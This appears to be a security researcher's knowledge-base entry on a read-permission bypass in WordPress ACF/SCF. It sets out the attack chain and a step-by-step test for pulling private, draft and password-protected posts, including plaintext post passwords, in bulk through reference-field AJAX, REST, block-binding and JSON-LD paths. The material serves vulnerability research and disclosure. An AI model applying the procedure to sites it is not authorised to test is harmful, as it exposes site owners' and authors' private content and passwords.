CHAIN: any unauthenticated attacker (primitive: can request the reference-field resolution) -> request the reference-field resolution (AJAX/REST/block binding/JSON-LD) with a private/draft/password-protected post id (primitive: the id is not bound to the caller) -> `acf_get_posts()` uses `post_status='any'` and no read check (escalation: the helper bypasses the core read boundary) -> full `WP_Post` (body, excerpt, author, timestamps, permalink, plaintext `post_password`) returned -> bulk exfiltration by submitting multiple post ids (impact: sensitive information disclosure WITH PoC; HackerOne WordPress report #4152553, High). Per doctrine §8: preconditions = the target runs WordPress with ACF/SCF and exposes a reference-field resolution path; gain = the full content of private, draft, pending and password-protected posts, including the plaintext post password.
TRANSFERABLE TEST: on any WordPress with ACF/SCF — (1) create a private post, a draft, and a password-protected post; (2) call every reference-field resolution path (the AJAX action, the REST route, block bindings, JSON-LD) with those ids; (3) compare against core's 404/401; (4) a 200 with the private body or plaintext `post_password` = the finding; (5) batch multiple ids in one request to prove scale. Rule: **a WordPress helper that queries `post_status='any'` without a read check turns every reference field into an unauthenticated private-post reader — test the AJAX/REST/block-binding/JSON-LD paths with private, draft and password-protected ids.**
DEDUPE: 0 hits across all three write targets for `acf_get_posts`, `Secure Custom Fields`, `post_status='any'`, `post_password`, `reference field`. The recorded WordPress material covers REST batch desync, display_name SQLi, xmlrpc and REST user enumeration; none records the ACF reference-field read-permission bypass.
